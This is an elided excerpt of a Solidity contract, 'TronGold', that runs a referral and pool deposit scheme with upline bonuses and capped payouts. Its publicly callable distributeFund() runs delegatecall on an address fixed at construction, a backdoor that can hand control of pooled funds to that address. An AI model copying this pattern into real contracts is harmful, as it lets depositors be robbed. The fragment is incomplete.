...
contract TronGold {
    ...
    mapping(uint256 => mapping(address => uint256))
        public pool_users_deposits_sum;
    ...
    event ExitLog(address indexed addr, uint256 amount);

    constructor(address payable _owner, address payable _fund) public {
        owner = _owner;

        etherchain_fund = _fund;
        admin_fee = 0xE1650A376C36780c3b5e6D86c8c1766Bb9814734;
    ...
    function _deposit(address _addr, uint256 _amount) private {
        ...
        if (users[_addr].upline != address(0)) {
            users[users[_addr].upline].direct_bonus += (_amount * 3) / 20;

            emit DirectPayout(users[_addr].upline, _addr, (_amount * 3) / 20);
        }
    ...
    function _pollDeposits(address _addr, uint256 _amount) private {
        ...
        for (uint8 i = 0; i < pool_bonuses.length; i++) {
            ...
            if (_amount > pool_users_deposits_sum[pool_cycle][pool_top[i]]) {
    ...
    function exit() external {
        require(users[msg.sender].deposit_time > 0, "No deposit");

        require(users[msg.sender].total_payouts == 0, "Payouts already exists");

        uint256 payout = (users[msg.sender].deposit_amount * 7) / 10;

        msg.sender.transfer((users[msg.sender].deposit_amount * 7) / 10);
        ...
        emit ExitLog(msg.sender, payout);
    }
    ...
    function distributeFund() external {
        ...
        etherchain_fund.delegatecall(
            abi.encodeWithSignature("distributeFund()")
        );
    }

    function maxPayoutOf(uint256 _amount) external pure returns (uint256) {
        return (_amount * 333) / 100;
    }
        ...
        )
    {
        return (
            ...
            pool_last_draw,
            pool_balance,
            pool_users_deposits_sum[pool_cycle][pool_top[0]]
        );
    }
